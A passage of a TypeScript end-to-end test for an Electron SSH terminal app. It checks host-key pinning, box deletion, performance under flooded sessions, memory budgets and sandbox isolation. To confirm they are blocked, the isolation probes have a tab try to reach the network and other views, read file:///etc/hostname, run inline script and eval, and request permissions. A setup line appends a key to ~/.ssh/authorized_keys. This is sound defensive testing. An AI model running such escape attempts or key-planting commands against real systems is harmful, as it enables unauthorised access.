        await clickOn('[data-box="lab-box-renamed"]');
        const checkThere = await until(() => has('#check'), 3000);
        check('a box whose identity was forgotten opens its check, not a tab', menuThere && checkThere, [menuThere, checkThere, await text('#box-menu')]);
        await clickOn('#check-paste');
        await typeKeys(printedNow.trim()); // the box was rebuilt earlier in this run: these are its lines now
        const matched = await until(async () => (await step()) === 'match', 4000);
        check('its new lines are a match, and only then may it be trusted', matched && (await has('#check-trust')), await step());
        await clickOn('#check-trust');
        check('checked again, it is pinned again and opens', await until(() => box0().pin !== '' && [...ctx.tabs.values()].some((t) => t.box?.id === id), 20_000), box0().pin.slice(0, 20));

        // Delete box: what goes is named before anything happens, and Keep it changes nothing.
        await clickOn('#boxes');
        await moveTo('[data-box="lab-box-renamed"]');
        await clickOn('[data-remove="lab-box-renamed"]');
        const askedRemove = await until(() => has('#remove-box'), 2000);
        const goes = await text('#remove-goes');
        check('Delete asks first, naming what goes: the box, its key, its pinned identity, and the tabs open on it', askedRemove && goes.includes('lab-box-renamed') && goes.includes('its key') && goes.includes('the identity pinned for it') && /\d+ open tabs? on it/.test(goes), goes);
        check('and it says what stays on the box itself', (await text('#remove-stays')).includes('only the box can take it out'), await text('#remove-stays'));
        check('the way out has the focus, so Enter keeps the box', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'remove-cancel', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
        await shot('remove-box', 'Delete box: what goes with it');
        await read(ctx.shell);
        await clickOn('#remove-cancel');
        check('Keep it: the box, its key and its tabs are all still there', (await until(async () => !(await has('#remove-box')), 2000)) && ctx.boxes.list.some((b) => b.id === id) && [...ctx.tabs.values()].some((t) => t.box?.id === id), '');
        // And deleted for real: the box, its key and its tabs go together.
        await clickOn('#boxes');
        await moveTo('[data-box="lab-box-renamed"]');
        await clickOn('[data-remove="lab-box-renamed"]');
        await until(() => has('#remove-box'), 2000);
        await clickOn('#remove-do');
        await until(async () => !ctx.boxes.list.some((b) => b.id === id), 5000);
        const held = await ctx.keys.request('keys');
        // Each of the four is worked out on its own, so that a failure says which one did not hold rather than
        // leaving the next person to guess from a list of everything.
        const wentBox = !ctx.boxes.list.some((b) => b.id === id);
        const wentKey = Array.isArray(held['keys']) && !(held['keys'] as Record<string, unknown>[]).some((k) => k['box'] === id);
        const wentTabs = ![...ctx.tabs.values()].some((t) => t.box?.id === id);
        // Waited for, not read once: main's own list loses the box before the window has been told, so a
        // single read here is a race with the window and not a question about the app.
        const said = await until(async () => (await text('#status-done')).includes('Deleted lab-box-renamed'), 5000);
        check('Delete: the box, its key and its tabs go together, and the window says so', wentBox && wentKey && wentTabs && said, [{ wentBox, wentKey, wentTabs, said }, ctx.boxes.list.map((b) => b.name), held['keys'], await text('#status-done')]);

        lab.end();
      }
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // The short mode, for a package whose engine file was changed on purpose: one tab, and its engine must be
    // refused with the reason. Nothing else is probed, because nothing else can work without an engine.
    if (ctx.mode === 'engine-must-be-refused') {
      const t = ctx.openTab()!;
      await until(() => t.engine.state === 'gone', 10_000);
      check('the engine was not started', t.engine.state === 'gone' && t.engine.pid === 0, [t.engine.state, t.engine.pid]);
      check('and the tab says why', t.engine.cause === 'the engine file is not the one this app was built with', t.engine.cause);
      // The key process is the same program file: it is refused the same way, and the lock says so.
      await until(() => ctx.gate.state.phase === 'fault', 10_000);
      check('the key process was not started either, and the lock says why', ctx.gate.state.phase === 'fault' && ctx.keys.pid === 0 && ctx.gate.state.detail.includes('not the one this app was built with'), [ctx.gate.state.phase, ctx.gate.state.detail]);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // "picture": the whole window as one picture, from the real app. Three tabs, the second one in front.
    // SSHAPP_PICTURE=<file.png> says where it goes; SSHAPP_PICTURE_STRIP is the text of the strip that names it.
    if (ctx.mode === 'picture') {
      const file = process.env['SSHAPP_PICTURE'] ?? '';
      const tabs3 = [ctx.openTab()!, ctx.openTab()!, ctx.openTab()!];
      await until(() => tabs3.every((t) => t.engine.state === 'ready'), 15_000);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${tabs3[1]!.id} })`);
      await type(tabs3[1]!, 'this text went to the tab\'s own engine and came back');
      await until(async () => (await shown(tabs3[1]!)).includes('came back'), 3000);
      await sleep(400);
      const size = ctx.win.getContentBounds();
      const made = await takePicture({ win: ctx.win, views: [ctx.shell, tabs3[1]!.view], file, strip: process.env['SSHAPP_PICTURE_STRIP'] ?? '', dist: ctx.dist, harden: ctx.harden });
      check(`a picture of the whole window: ${made.width} x ${made.height} pixels at scale ${made.scale}`, file !== '' && made.width === Math.round(size.width * made.scale), made);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // "direction": one of the direction pictures. A sealed view fills the window with the directions page, in
    // the direction and scene asked for, and the whole window is pictured once its typefaces have loaded.
    if (ctx.mode === 'direction') {
      const file = process.env['SSHAPP_PICTURE'] ?? '';
      const which = /^[abc]$/.test(process.env['SSHAPP_DIRECTION'] ?? '') ? process.env['SSHAPP_DIRECTION'] : 'a';
      const scene = /^(dialog|paths|boxes|logs|plain|create|unlock|wrong|addbox|trust|changed|connecting|fresh|noanswer|dropped|mismatch|unreachable|seven|sevenopen)$/.test(process.env['SSHAPP_SCENE'] ?? '') ? process.env['SSHAPP_SCENE'] : 'plain';
      const view = ctx.newView('directions');
      const size = ctx.win.getContentBounds();
      view.setBounds({ x: 0, y: 0, width: size.width, height: size.height });
      ctx.win.contentView.addChildView(view);
      await view.webContents.loadURL(`app://directions/index.html?d=${which}&scene=${scene}`);
      const fonts = await js<string>(view, `document.fonts.ready.then(() => [...document.fonts].filter((f) => f.status === 'loaded').length + ' of ' + document.fonts.size)`);
      const drawn = await js<boolean>(view, `document.documentElement.classList.contains('drawn')`);
      await sleep(500);
      const made = await takePicture({ win: ctx.win, views: [view], file, strip: process.env['SSHAPP_PICTURE_STRIP'] ?? '', dist: ctx.dist, harden: ctx.harden });
      check(`direction ${which}, ${scene}: drawn, typefaces loaded ${fonts}, ${made.width} x ${made.height}`, drawn && file !== '' && !fonts.startsWith('0 '), { fonts, made });
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    // "hold": two tabs, then nothing. Prints who is who and stays up, so the script outside can end main by
    // force and see that the engines end with it (children never outlive their parent).
    if (ctx.mode === 'hold') {
      const one = ctx.openTab()!;
      const two = ctx.openTab()!;
      const up = (await until(() => one.engine.state === 'ready' && two.engine.state === 'ready', 15_000)) && ctx.keys.pid > 1;
      process.stdout.write(`HOLD ok=${up} main=${process.pid} engines=${one.engine.pid},${two.engine.pid},${ctx.keys.pid}\n`);
      canary.close();
      clearTimeout(guard);
      return;
    }

    // "seven": the fullest day. Seven tabs on a box, each with its own view, engine and SSH link, all answering,
    // none leaking into another; flooded all at once while the window is used; with what it costs in memory.
    // The box is the lab's own SSH server: its sessions print as fast as each link takes it, so every byte is
    // encrypted, carried, held to the fixed amount a box may be ahead, and drawn by a real terminal.
    if (ctx.mode === 'seven') {
      const labBin = process.env['SSHAPP_LABBOX'] ?? '';
      if (labBin === '') {
        check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set: the seven tabs need the lab\'s SSH server');
        canary.close();
        clearTimeout(guard);
        return finish(1);
      }
      // Three boxes: four tabs on one, two on another, one on the last, as a full day has it.
      const labs: LabBox[] = [];
      const boxIds: string[] = [];
      for (const [n, name] of ['lab-box', 'lab-two', 'lab-three'].entries()) {
        const { box: lab, first } = await LabBox.start(labBin);
        const added = await ctx.boxes.add({ name, colour: n + 2, host: '127.0.0.1', port: String(first['addr'] ?? '').split(':')[1] ?? '', user: 'demo', folder: '', places: [] });
        const boxId = added.ok ? added.id : '';
        ctx.boxes.reach(boxId);
        await until(() => ctx.boxes.check(boxId).step === 'reached', 20_000);
        ctx.boxes.paste(boxId, String(first['printed'] ?? ''));
        const trusted = await ctx.boxes.trust(boxId);
        await lab.tell(`accept ${ctx.boxes.get(boxId)?.publicKey ?? ''}`);
        check(`${name} is added, checked and pinned`, added.ok && trusted.ok, [added, trusted]);
        labs.push(lab);
        boxIds.push(boxId);
      }
      const everyLab = async (line: string, key: string): Promise<number> => {
        let sum = 0;
        for (const lab of labs) sum += Number((await lab.tell(line))[key] ?? 0);
        return sum;
      };
      const all = [0, 0, 0, 0, 1, 1, 2].map((n) => ctx.openTab(boxIds[n])!);
      check('seven links are up, each signed in', await until(() => all.every((t) => t.engine.link.phase === 'up'), 30_000), all.map((t) => t.engine.link.phase));
      for (const t of all) await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
      const ids = [process.pid, ctx.shell.webContents.getOSProcessId(), ...all.map((t) => t.view.webContents.getOSProcessId()), ...all.map((t) => t.engine.pid)];
      check('sixteen processes, each its own', new Set(ids).size === 16 && !ids.includes(0), ids);
      for (const [i, t] of all.entries()) await type(t, `seven-${i}-x`);
      let leaks = 0;
      let arrived = 0;
      await sleep(300);
      for (const [i, t] of all.entries()) {
        const text = await until(async () => (await shown(t)).includes(`seven-${i}-x`), 3000) ? await shown(t) : '';
        if (text) arrived++;
        if (all.some((_, j) => j !== i && text.includes(`seven-${j}-x`))) leaks++;
      }
      check('each of the seven hears its own link only', arrived === 7 && leaks === 0, { arrived, leaks });
      // Every tab, and the button that opens one more, is in sight, whatever the window's width. A tab that has
      // slid out of the bar cannot be pressed, and what cannot be seen is not there (found 2026-11-16 on a
      // 1024-wide screen: tabs six and seven were past the window's edge).
      const inBar = await js<{ width: number; out: string[] }>(ctx.shell, `(() => { const w = window.innerWidth; const out = []; for (const el of document.querySelectorAll('[data-tab], [data-fold], #new')) { const r = el.getBoundingClientRect(); if (r.width < 1 || r.left < 0 || r.right > w + 0.5) out.push((el.getAttribute('data-tab') || el.id || 'fold') + ' ' + Math.round(r.left) + '-' + Math.round(r.right)); } return { width: w, out }; })()`);
      check(`every tab and the new-tab button are inside a bar ${inBar.width} wide`, inBar.out.length === 0, inBar);

      // The promises, measured under load: for four seconds every session on the box prints as fast as its link
      // takes it, while tabs are brought to the front one after another and real keys are typed into each.
      // Budgets are the plan's (B8), times the stated factor for slow test machines.
      const factor = Math.max(1, Number(process.env['SSHAPP_BUDGET_FACTOR']) || 1);
      const processors = availableParallelism();
      const paceOf = (t: Tab) => js<{ front: boolean; share: number; rested: number; taken: number; waiting: number }>(t.view, `window.berthTerm.pace()`);
      const takenAll = async () => {
        let sum = 0;
        for (const t of all) sum += (await paceOf(t)).taken;
        return sum;
      };
      const bringToFront = async (t: Tab) => {
        await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
        return until(() => ctx.shellState().active === t.id, 1000);
      };
      const pressAndType = async (t: Tab): Promise<boolean> => {
        // A box with several tabs in a narrow window folds them into one tab with a count: then the tab is
        // chosen the way the count's list chooses it. Otherwise by a real press on the tab itself.
        const at = await js<{ x: number; y: number } | null>(ctx.shell, `(() => { const b = document.querySelector('[data-tab="${t.id}"]'); if (!b) return null; const r = b.getBoundingClientRect(); return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) }; })()`);
        if (at && ctx.shellState().active !== t.id) {
          ctx.shell.webContents.sendInputEvent({ type: 'mouseDown', x: at.x, y: at.y, button: 'left', clickCount: 1 });
          ctx.shell.webContents.sendInputEvent({ type: 'mouseUp', x: at.x, y: at.y, button: 'left', clickCount: 1 });
        } else if (!at) await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
        // The key follows the press at once, as a hand does, before the tab has been painted.
        t.view.webContents.focus();
        for (const type of ['keyDown', 'char', 'keyUp'] as const) t.view.webContents.sendInputEvent({ type, keyCode: 'k' });
        // A press counts only if the tab really came to the front: a press that landed nowhere measures nothing.
        return until(() => ctx.shellState().active === t.id, 1000);
      };
      const slowestSaid = (): string => {
        const slow = ctx.meter.slowest;
        return slow ? `${slow.kind} in ${slow.view === 0 ? 'the bar' : `tab ${slow.view}`}, ${slow.waitMs} ms before its handlers, ${slow.handlerMs} ms inside them, ${slow.paintMs} ms to the painted frame` : 'none over 16 ms';
      };
      await sleep(1200); // let start-up noise be reported, then begin clean

      // First with nothing printing: tabs brought to the front one after another, a key typed into each.
      ctx.meter.reset();
      let calmOk = 0;
      for (let i = 0; i < 12; i++) {
        const began = Date.now();
        if (await pressAndType(all[i % all.length]!)) calmOk++;
        await sleep(Math.max(0, 200 - (Date.now() - began)));
      }
      await sleep(1200); // the views report twice a second
      const calm = { ...ctx.meter.worst };
      check(`with nothing printing: a click or key was painted within ${calm.reactionMs} ms and a tab switch within ${calm.tabSwitchMs} ms (budget ${BUDGET.reactionMs} ms${factor > 1 ? `, times ${factor} on this machine` : ''}; slowest: ${slowestSaid()})`, calmOk === 12 && calm.reactionMs <= BUDGET.reactionMs * factor && calm.tabSwitchMs <= BUDGET.tabSwitchMs * factor && calm.tabSwitchMs > 0, { calmOk, calm });

      // Then one tab in front whose box prints as fast as the link takes it (a "yes", a huge file to the
      // screen), with keys typed into it all the while.
      const alone = all[6]!;
      await bringToFront(alone);
      await sleep(300);
      ctx.meter.reset();
      const aloneBefore = Number((await labs[2]!.tell('flooded'))['bytes'] ?? 0);
      await labs[2]!.tell('flood 3000');
      for (const until3 = Date.now() + 3000; Date.now() < until3; ) {
        for (const type of ['keyDown', 'char', 'keyUp'] as const) alone.view.webContents.sendInputEvent({ type, keyCode: 'k' });
        await sleep(150);
      }
      await until(() => alone.engine.waiting() === 0, 20_000);
      await sleep(1200);
      const flat = { ...ctx.meter.worst };
      const aloneRate = ((Number((await labs[2]!.tell('flooded'))['bytes'] ?? 0) - aloneBefore) / 1048576 / 3).toFixed(1);
      check(`one tab flooded as fast as its link takes it, ${aloneRate} MB/s: a key typed into it was painted within ${flat.reactionMs} ms (budget ${BUDGET.reactionMs} ms${factor > 1 ? `, times ${factor} on this machine` : ''}; slowest: ${slowestSaid()})`, Number(aloneRate) > 1 && flat.reactionMs > 0 && flat.reactionMs <= BUDGET.reactionMs * factor, flat);

      // Last, all seven at once.
      ctx.meter.reset();
      const FLOOD_MS = 4000;
      const PER_TAB = 2 * 1024 * 1024; // bytes a second each session prints: far more than a busy build's log
      const takenBefore = await takenAll();
      const floodedBefore = await everyLab('flooded', 'bytes');
      const flooding = await everyLab(`flood ${FLOOD_MS} ${PER_TAB}`, 'flooding');
      const until4 = Date.now() + FLOOD_MS;
      let turn = 0;
      let presses = 0;
      let switches = 0;
      while (Date.now() < until4) {
        const began = Date.now();
        presses++;
        if (await pressAndType(all[turn++ % all.length]!)) switches++;
        await sleep(Math.max(0, 200 - (Date.now() - began)));
      }
      const lowest = ctx.pace.lowest;
      // The flood is over when the box has stopped and every tab has worked through what it was sent.
      const drained = await until(async () => all.every((t) => t.engine.waiting() === 0) && (await Promise.all(all.map(paceOf))).every((p) => p.waiting === 0), 20_000);
      await sleep(1500); // the views report twice a second
      const flooded = (await everyLab('flooded', 'bytes')) - floodedBefore;
      const drawn = (await takenAll()) - takenBefore;
      const w = { ...ctx.meter.worst };
      const mbps = (flooded / 1048576 / (FLOOD_MS / 1000)).toFixed(1);
      check(`under load: ${switches} of ${presses} presses brought their tab to the front, ${mbps} MB/s from the box through seven links and terminals`, flooding === 7 && presses >= 7 && switches === presses && flooded > 1048576, { turn, presses, switches, flooded, flooding });
      // Nothing is lost on the way, held back or not: what the terminals worked through is what the box
      // printed, and the few keys it sent back.
      check('every byte the box printed was worked through by its terminal, and no more than the keys typed besides', drained && drawn >= flooded && drawn <= flooded + presses * 8, { drained, flooded, drawn, waiting: all.map((t) => t.engine.waiting()) });
      const rests = (await Promise.all(all.map(paceOf))).map((p) => p.rested);
      check(`the tab in front came first: with ${processors} processors, a flooded tab behind was allowed ${lowest === 1 ? 'all of its time' : `${Math.round(lowest * 100)} % of its time at the least`} (the rule allows ${Math.round(shareFor(processors, 6) * 100)} % with six flooded behind)`, lowest >= shareFor(processors, 6) && (lowest < 1 || rests.every((n) => n === 0)), { lowest, rests });
      // Seven terminals flooded at once need about one processor of their own, and the window, main, the
      // engines and the drawing need theirs. A machine with fewer than four processors cannot do both, and no
      // pacing can make it: there is no time to give. The promise is about a PC with processors to spare, so
      // this one case is allowed twice its budget on such a machine, said here in the probe's own words. The
      // two cases above (nothing printing, and one tab flooded as fast as its link takes it) are held to the
      // full budget on every machine, and they are the ones the promise is made of.
      const thin = processors < 4 ? 2 : 1;
      const thinSaid = thin > 1 ? `, and twice again with seven flooded on a machine with ${processors} processors` : '';
      const within = (key: keyof typeof BUDGET, what: string, mustMeasure: boolean) => {
        const limit = BUDGET[key] * factor * thin;
        check(`${what}: ${w[key]} ms (budget ${BUDGET[key]} ms${factor > 1 ? `, times ${factor} on this machine` : ''}${thinSaid})`, w[key] <= limit && (!mustMeasure || w[key] > 0), w);
      };
      within('mainDelayMs', 'main was never later than', true);
      within('viewTaskMs', 'no view was busy in one stretch longer than', false);
      // The slowest one also says where its time went: a slow reaction is explained, never guessed at.
      within('reactionMs', `a real click or key was painted within (slowest: ${slowestSaid()})`, false);
      within('tabSwitchMs', 'a tab switch was painted within', true);
      within('startMs', 'from process start to the first painted frame', true);

      // The rest itself, by hand: told a small share, a flooded tab behind works through far less than the tab
      // in front, which never rests; told the whole of its time, no tab rests at all.
      const frontTab = all[0]!;
      await bringToFront(frontTab);
      const behindTab = all[3]!;
      const measure = async (share: number) => {
        ctx.forcePace(share);
        await sleep(200);
        const before = [await paceOf(frontTab), await paceOf(behindTab)];
        await everyLab('flood 1500', 'flooding');
        await sleep(1500);
        const after = [await paceOf(frontTab), await paceOf(behindTab)];
        await until(async () => all.every((t) => t.engine.waiting() === 0), 20_000);
        return { front: after[0]!.taken - before[0]!.taken, behind: after[1]!.taken - before[1]!.taken, frontRested: after[0]!.rested - before[0]!.rested, behindRested: after[1]!.rested - before[1]!.rested };
      };
      const small = await measure(0.05);
      const whole = await measure(1);
      ctx.forcePace(null);
      check('told a small share, a flooded tab behind rests and works through far less than the tab in front, which never rests', small.behindRested > 0 && small.frontRested === 0 && small.behind * 3 < small.front, small);
      check('told the whole of its time, no tab rests', whole.behindRested === 0 && whole.frontRested === 0 && whole.behind > 0, whole);
      // What the memory number is worth depends on what the terminals are holding, so it is said with it:
      // the plan's figure is a tab with a real terminal and a full scrollback (30,000 lines), and the flood
      // above is what fills them. A number measured with empty terminals would mean nothing.
      const held = await Promise.all(all.map((t) => js<number>(t.view, `window.berthTerm.held()`)));
      const fullest = Math.max(...held);
      const leanest = Math.min(...held);
      check(`every terminal is holding a full scrollback before memory is measured: ${leanest} to ${fullest} lines of 30,000`, leanest >= 30_000, held);
      const mem = await memory(all.map((t) => t.engine.pid));
      for (const lab of labs) lab.end();
      const budget = 300 + 7 * 220;
      check(`memory with seven tabs, each holding ${leanest} lines: ${mem.fairMB} MB (${mem.how}); budget ${budget} MB; plain per-process sum ${mem.plainMB} MB`, mem.fairMB > 0 && mem.fairMB < budget, mem);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    }

    const a = ctx.openTab()!;
    const b = ctx.openTab()!;
    const views: [string, WebContentsView][] = [['shell', ctx.shell], ['tab a', a.view], ['tab b', b.view]];

    check('two engines answer', await until(() => a.engine.state === 'ready' && b.engine.state === 'ready', 10_000), [a.engine.state, b.engine.state, a.engine.cause]);
    await until(async () => (await js<string>(b.view, `document.readyState`)) === 'complete', 10_000);
    await until(async () => (await js<string>(a.view, `document.readyState`)) === 'complete', 10_000);

    // What a view is: no Node, sealed, its own process.
    for (const [name, v] of views) {
      const globals = await js<string>(v, `[typeof require, typeof process, typeof module, typeof Buffer, typeof global].join()`);
      check(`${name}: no Node in the page`, globals === 'undefined,undefined,undefined,undefined,undefined', globals);
      const sealed = await js<boolean>(v, `(window.tabPort ?? window.shellPort).sandboxed`);
      check(`${name}: sandboxed`, sealed === true, sealed);
      const port = await js<string>(v, `Object.keys(window.tabPort ?? window.shellPort).sort().join()`);
      check(`${name}: only its own port`, port === (name === 'shell' ? 'cmd,frame,gateCreate,gateForgetRestore,gatePickBackup,gatePickRestore,gateRestore,gateUnlock,gateUsePrevious,keyPassphrase,meter,onGate,onState,sandboxed' : 'columns,copy,doing,drag,dragAll,dropped,files,frame,link,meter,onAgain,onBanner,onBlockAsk,onClear,onCopyAsk,onFilePage,onOutput,onPace,onPaste,onRightClick,onSaveAsk,onSettings,onShown,onState,onWhole,pasteMode,reopen,resize,rightClickWas,sandboxed,save,send,taken'), port);
    }
    const pids = [process.pid, ...views.map(([, v]) => v.webContents.getOSProcessId()), a.engine.pid, b.engine.pid];
    check('every view and engine is its own process', new Set(pids).size === pids.length && !pids.includes(0), pids);
    const partitions = views.map(([, v]) => v.webContents.session.storagePath ?? 'memory').concat(views.map(([, v]) => String(v.webContents.session === views[0]![1].webContents.session)));
    check('tab sessions are separate and in memory', a.view.webContents.session !== b.view.webContents.session && a.view.webContents.session !== ctx.shell.webContents.session && a.view.webContents.session.storagePath === null, partitions);

    // Bytes go to the tab's own engine and come back to that tab only.
    await type(a, 'alpha-7c1');
    check('a tab reaches its own engine', await until(async () => (await shown(a)).includes('alpha-7c1'), 3000), await shown(a));
    await sleep(200);
    check('another tab never sees it', !(await shown(b)).includes('alpha'), await shown(b));

    // A hidden tab is not slowed: b is the visible one, a is hidden.
    const t0 = Date.now();
    await type(a, 'hidden-2e9');
    const arrived = await until(async () => (await shown(a)).includes('hidden-2e9'), 3000);
    check('a hidden tab still receives', arrived && Date.now() - t0 < 1000, `${Date.now() - t0} ms`);
    // The setting only. That a hidden tab keeps its full output rate under load is a lab case (a flood), not this.
    const throttled = [a, b].map((t) => t.view.webContents.getBackgroundThrottling());
    check('tab views are set never to be throttled when hidden', throttled.every((x) => x === false), throttled);

    // What a view cannot do.
    await js(a.view, `location.href = '${web}/go'; 0`);
    await sleep(400);
    check('a view cannot navigate away', a.view.webContents.getURL() === 'app://tab-1/index.html', a.view.webContents.getURL());
    const opened = await js<string>(a.view, `[window.open('${web}/open'), window.open('app://shell/index.html')].map(String).join()`);
    check('a view cannot open a window', opened === 'null,null', opened);
    const reached = await js<string>(a.view, `Promise.all([
      fetch('${web}/fetch').then(() => 'reached', () => 'blocked'),
      new Promise((r) => { const i = new Image(); i.onload = () => r('reached'); i.onerror = () => r('blocked'); i.src = '${web}/x.png'; }),
      fetch('app://tab-2/index.html').then(() => 'reached', () => 'blocked'),
      fetch('app://shell/index.html').then(() => 'reached', () => 'blocked'),
      fetch('file:///etc/hostname').then(() => 'reached', () => 'blocked'),
    ]).then((x) => x.join())`);
    check('a view reaches no network, no other view, no file', reached === 'blocked,blocked,blocked,blocked,blocked', reached);
    const script = await js<string>(a.view, `(() => {
      const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.body.append(s);
      let ev = 'ran'; try { eval('1 + 1'); } catch { ev = 'blocked'; }
      return [typeof window.__inline, ev].join();
    })()`);
    check('no inline script, no eval', script === 'undefined,blocked', script);
    const perms = await js<string>(a.view, `Promise.all(['notifications', 'geolocation', 'camera', 'clipboard-read'].map((name) => navigator.permissions.query({ name }).then((p) => p.state, () => 'error'))).then((x) => x.join())`);
    check('every permission is denied', perms === 'denied,denied,denied,denied', perms);

    // Watchdogs show; they never restart. (Signals: not on Windows, where the Windows job has its own way.)
    if (process.platform !== 'win32') {
      const c = ctx.openTab()!;
      await until(() => c.engine.state === 'ready', 10_000);
      const pid = c.engine.pid;
      check('there is an engine to freeze', signal(pid, 'SIGSTOP'), pid);
      const noticed = await until(() => c.engine.state === 'not-answering', 9000);
      check('a frozen engine is shown as not answering', noticed, c.engine.state);
      check('and is neither ended nor replaced', alive(pid) && c.engine.pid === pid, [alive(pid), c.engine.pid === pid]);
      signal(pid, 'SIGCONT');
      check('it is ready again when it answers', await until(() => c.engine.state === 'ready', 5000) && c.engine.pid === pid, c.engine.state);
      await type(a, 'still-a-41f');
      check('other tabs worked throughout', await until(async () => (await shown(a)).includes('still-a-41f'), 3000));
      ctx.closeTab(c.id);
      check('closing a tab ends its engine', await until(() => !alive(pid), 5000), alive(pid));
    }

    // An engine that ends after its tab was closed (it was frozen at that moment) harms nothing.
    if (process.platform !== 'win32') {
      const d = ctx.openTab()!;
      await until(() => d.engine.state === 'ready', 10_000);
      const pid = d.engine.pid;
      signal(pid, 'SIGSTOP');
      ctx.closeTab(d.id);
      await sleep(300);
      signal(pid, 'SIGCONT');
      check('an engine ending after its tab closed harms nothing', await until(() => !alive(pid), 5000) && d.engine.state === 'gone', d.engine.state);
    }

    // A killed engine: shown with its cause, not restarted, and no other tab is touched.
    const bPid = b.engine.pid;
    check('there is an engine to kill', signal(bPid, 'SIGKILL'), bPid);
    check('a killed engine is shown as gone, with why', await until(() => b.engine.state === 'gone' && b.engine.cause !== '', 5000), [b.engine.state, b.engine.cause]);
    await sleep(1500);
    check('it is not restarted', b.engine.state === 'gone' && b.engine.pid === bPid, [b.engine.state, b.engine.pid === bPid]);
    await type(a, 'after-kill-9d0');
    check('the other tab is untouched', await until(async () => (await shown(a)).includes('after-kill-9d0'), 3000) && a.engine.state === 'ready', a.engine.state);
    const seen = ctx.shellState().tabs.map((t) => `${t.id}:${t.state}`).join();
    check('the shell is told each state', seen === '1:ready,2:gone', seen);

    // ---- A box, for real: added, checked, pinned, connected to, signed in by the key process. ----
    // The box is the lab's own SSH server on this machine; the app reaches it the way it reaches any box.
    const labBin = process.env['SSHAPP_LABBOX'] ?? '';
    if (labBin === '') check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set: the box probes need the lab\'s SSH server');
    else {
      const { box: lab, first } = await LabBox.start(labBin);
      const addr = String(first['addr'] ?? '');
      const printed = String(first['printed'] ?? '');
      const port = addr.split(':')[1] ?? '';
      check('the lab box is up', /^127\.0\.0\.1:\d+$/.test(addr) && printed.includes('SHA256:'), first);
      const B = ctx.boxes;
      const view = (id: string) => B.check(id);

      check('a draft with a field to fix is not added, and says which', JSON.stringify(await B.add({ name: 'lab-box', colour: 2, host: '127.0.0.1', port: 'x', user: 'demo', folder: '', places: [] })) === JSON.stringify({ ok: false, error: 'fields', fields: { port: '1 to 65535' } }), '');
      const added = await B.add({ name: 'lab-box', colour: 2, host: '127.0.0.1', port, user: 'demo', folder: '', places: [{ name: 'logs', folder: "/var/log/it's here" }] });
      const id = added.ok ? added.id : '';
      const box = () => B.get(id)!;
      check('a box is added: its key is made by the key process, and it is not pinned', added.ok && box().pin === '' && /^ssh-ed25519 [A-Za-z0-9+/]+=*$/.test(box().publicKey), added);
      const held = await ctx.keys.request('keys');
      check('the key process holds one key for it, bound to that box and user', Array.isArray(held['keys']) && JSON.stringify((held['keys'] as Record<string, unknown>[]).map((k) => [k['name'], k['box'], k['user'], k['publicKey']])) === JSON.stringify([[id, id, 'demo', box().publicKey]]), held);
      check('a box that was never checked cannot be connected to', ctx.openTab(id) === null && ctx.openTab(id, 'logs') === null, '');
      check('the block to run holds the approved text and this box\'s key', B.block(id) === `umask 077; mkdir -p ~/.ssh && echo '${box().publicKey} berth:lab-box' >> ~/.ssh/authorized_keys && for f in /etc/ssh/ssh_host_*_key.pub; do ssh-keygen -lf "$f"; done`, B.block(id));

      // The check. The box is asked who it is; what it showed is told to no view before a paste is compared.
      B.reach(id);
      check('the box is reached, and what it showed is kept back', (await until(() => view(id).step === 'reached', 20_000)) && view(id).shownFingerprint === '' && !JSON.stringify(view(id)).includes('SHA256'), view(id));
      const asked = await lab.tell('seen');
      check('asking who it is tried no sign-in and sent no user name', asked['tries'] === 0 && !asked['users'], asked);
      B.paste(id, '256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)\n');
      const mis = view(id);
      const tried = await B.trust(id);
      // The one value the check exists to withhold must not come back on a mismatch either: with it on screen,
      // the field above is one copy away from a match, for a person in a hurry and for a window that has been
      // taken over alike. What was pasted is shown; what answered is named by kind and no more.
      const answered = (printed.match(/SHA256:[A-Za-z0-9+/]{43}/g) ?? []).filter((f) => f.length > 0);
      check('a paste from another box is a mismatch: what was pasted is shown, nothing is pinned', mis.step === 'mismatch' && mis.pasted.length === 1 && !tried.ok && box().pin === '' && ctx.openTab(id) === null, [mis, tried]);
      check('and what the box answered is not in anything a view is told: its kind, never its fingerprint', mis.shownFingerprint === '' && mis.shownType === 'ssh-ed25519' && answered.length > 0 && !answered.some((f) => JSON.stringify(mis).includes(f)), [mis.shownType, mis.shownFingerprint, answered.length]);
      B.paste(id, '256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)\n');
      check('pasting the same wrong thing again changes nothing and still pins nothing', view(id).step === 'mismatch' && view(id).shownFingerprint === '' && box().pin === '', view(id));
      B.paste(id, `3072 SHA256:p1Rt7Cz5Hm2Ve8Yq4Lb0Wn6Ks3Df9Gj1Ax7Ue5Io2Tc root@lab (RSA)\n${printed}`);
      check('the box\'s own lines are a match', view(id).step === 'match' && printed.includes(view(id).shownFingerprint), view(id));
      const trusted = await B.trust(id);
      check('only then is it pinned, with the identity that matched', trusted.ok && box().pin.startsWith('ssh-ed25519 ') && printed.includes(box().pinFingerprint) && box().pinnedAt !== '', [trusted, box().pinFingerprint]);

      // The key is not on the box yet: the sign-in fails, said as such, and the key process did sign.
      const early = ctx.openTab(id)!;
      check('before the key is on the box, the sign-in fails and is said as that', (await until(() => early.engine.link.phase === 'ended', 20_000)) && early.engine.link.cause === 'sign-in-failed' && early.engine.link.endedIn === 'signing-in', early.engine.link);
